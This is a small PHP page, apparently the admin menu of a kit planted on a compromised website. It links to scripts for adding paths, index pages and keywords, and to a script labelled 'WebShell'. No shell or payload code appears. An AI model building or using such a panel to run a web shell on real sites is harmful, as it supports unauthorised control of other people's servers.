<?php header('Content-Type: text/html; charset=utf-8'); 
?>

<!DOCTYPE html>
<html>
<head>
    <title>Warning!!!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        div {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        h2 {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
        .submit-button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Welcome ADMIN!!!!</h2>
        <a class="submit-button" href="/actionsmypaths.php">Add Paths</a>
        <a class="submit-button" href="/actionsmyindexs.php">Add Index</a>
        <a class="submit-button" href="/actionsmypathkey.php">Add Paths Keywords</a>
        <a class="submit-button" href="/actionsmyindexkey.php">Add Index Keywords</a>
        <a class="submit-button" href="/leon.php">WebShell</a>
    </div>
</body>
</html>
